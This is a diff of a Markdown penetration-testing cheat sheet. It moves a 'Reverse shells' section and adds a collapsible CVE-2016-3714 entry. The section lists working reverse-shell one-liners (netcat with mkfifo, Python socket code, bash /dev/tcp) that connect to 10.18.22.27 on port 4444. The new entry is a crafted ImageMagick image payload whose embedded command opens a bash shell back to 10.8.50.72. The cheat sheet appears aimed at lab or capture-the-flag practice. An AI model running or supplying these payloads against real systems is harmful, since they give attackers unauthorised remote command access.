@@ -15,6 +15,9 @@ Here are some handy tricks to enhance your pentesting workflow:
 ```python
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
+
+<details><summary>other</summary>
+
 #### Read file:
 ```python
 xxd -r file.txt 
@@ -38,22 +41,6 @@ cat > file << EOF
 EOF
 ```
 
----
-#### Reverse shells
-```nc
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
-```
-```python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-```
-```python
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
-```
-```bash
-bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
-```
-
----
 #### Set appropriate permissions for `id_rsa` file before usage:
 ```linux
 chmod 600 id_rsa
@@ -69,6 +56,39 @@ mkdir tmp/
 sudo mount -t nfs 10.10.104.64: tmp
 tree tmp
 ```
+
+</details>
+
+---
+#### Reverse shells
+```nc
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
+```
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```
+```python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+```
+```bash
+bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
+```
+<details><summary>CVE-2016–3714</summary>
+
+```
+cat > image.png << EOF
+push graphic-context
+encoding "UTF-8"
+viewbox 0 0 1 1
+affine 1 0 0 1 0 0
+push graphic-context
+image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.50.72/4444 0<&1 2>&1'
+pop graphic-context
+pop graphic-context
+EOF
+```
+</details>
+
 ---
 #### File Transfer on `Netcat`
 
